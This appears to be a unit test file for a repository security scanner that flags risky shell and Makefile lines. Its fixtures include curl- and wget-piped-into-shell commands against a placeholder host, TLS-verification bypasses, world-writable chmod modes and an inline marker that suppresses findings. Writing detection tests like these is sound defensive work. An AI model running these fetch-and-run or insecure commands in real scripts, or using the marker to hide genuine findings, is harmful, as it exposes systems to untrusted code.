"""Shell and Makefile rules: where curl | sh actually lives."""

import unittest

from repo_sentinel.findings import Severity
from repo_sentinel.scanners import shell


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def scan(text, path="scripts/setup.sh"):
    return shell.scan_script(path, text)


class TestRecognition(unittest.TestCase):
    def test_by_extension_and_by_name(self):
        for path in ("setup.sh", "ci/build.bash", "Makefile", "GNUmakefile", "rules.mk"):
            with self.subTest(path=path):
                self.assertTrue(shell.is_shell_path(path))

    def test_by_shebang_when_there_is_no_extension(self):
        # A setup script with no extension is still a shell script, and is
        # exactly what a repository accumulates.
        self.assertTrue(shell.is_shell_path("bootstrap", "#!/bin/sh\necho hi\n"))
        self.assertTrue(shell.is_shell_path("bin/release", "#!/usr/bin/env bash\n"))

    def test_other_files_are_left_alone(self):
        self.assertFalse(shell.is_shell_path("main.py", "import os\n"))
        self.assertFalse(shell.is_shell_path("README.md", "# curl x | sh\n"))


class TestDownloads(unittest.TestCase):
    def test_a_pipe_into_a_shell(self):
        findings = scan("curl -sSL https://x.invalid/i.sh | sh\n")
        self.assertEqual(findings[0].rule_id, "SH001")
        self.assertEqual(findings[0].severity, Severity.HIGH)

    def test_the_spellings_that_turn_up(self):
        for line in (
            "curl https://x.invalid | sudo bash",
            "wget -qO- https://x.invalid | zsh",
            'eval "$(curl -fsSL https://x.invalid)"',
        ):
            with self.subTest(line=line):
                self.assertIn("SH001", rule_ids(scan(line + "\n")))

    def test_a_download_on_its_own_is_not_a_finding(self):
        self.assertEqual(scan("curl -sSLo installer.sh https://x.invalid/i.sh\n"), [])

    def test_a_pipe_from_something_local_is_not_a_download(self):
        self.assertEqual(scan("cat script.sh | sh\n"), [])

    def test_a_commented_out_command_is_somebody_deciding_against_it(self):
        self.assertEqual(scan("# curl -sSL https://x.invalid/i.sh | sh\n"), [])

    def test_a_continuation_is_one_command_reported_where_it_starts(self):
        text = "curl -sSL \\\n  https://x.invalid/i.sh \\\n  | sh\n"
        findings = scan(text)
        self.assertIn("SH001", rule_ids(findings))
        self.assertEqual(findings[0].line, 1)

    def test_makefiles_count(self):
        self.assertIn("SH001", rule_ids(scan("install:\n\tcurl -s https://x.invalid | sh\n", "Makefile")))


class TestVerification(unittest.TestCase):
    def test_the_ways_to_switch_it_off(self):
        for line in (
            "curl -k https://x.invalid/pkg",
            "curl --insecure https://x.invalid/pkg",
            "wget --no-check-certificate https://x.invalid/pkg",
            "git -c http.sslVerify=false clone https://x.invalid/repo",
        ):
            with self.subTest(line=line):
                self.assertIn("SH002", rule_ids(scan(line + "\n")))

    def test_an_ordinary_fetch_is_fine(self):
        self.assertEqual(scan("curl -fsSLo pkg https://x.invalid/pkg\n"), [])


class TestPermissions(unittest.TestCase):
    def test_world_writable_modes(self):
        for line in ("chmod 777 /opt/app", "chmod -R 0666 /srv", "chmod a+w /etc/app.conf"):
            with self.subTest(line=line):
                self.assertIn("SH003", rule_ids(scan(line + "\n")))

    def test_the_who_list_decides(self):
        # "u+w" is an owner granting themselves write access, which is most
        # chmods ever written. "+w" with no who-list means all of them.
        self.assertIn("SH003", rule_ids(scan("chmod +w file\n")))
        self.assertIn("SH003", rule_ids(scan("chmod go+w file\n")))
        self.assertEqual(scan("chmod u+rwx file\n"), [])

    def test_ordinary_modes_are_fine(self):
        for line in ("chmod 644 /etc/app.conf", "chmod -R 755 /opt/app", "chmod u+w file"):
            with self.subTest(line=line):
                self.assertEqual(scan(line + "\n"), [])


class TestSuppression(unittest.TestCase):
    def test_line_marker(self):
        text = "curl -sSL https://x.invalid/i.sh | sh  # repo-sentinel: ignore\n"
        self.assertEqual(scan(text), [])


if __name__ == "__main__":
    unittest.main()
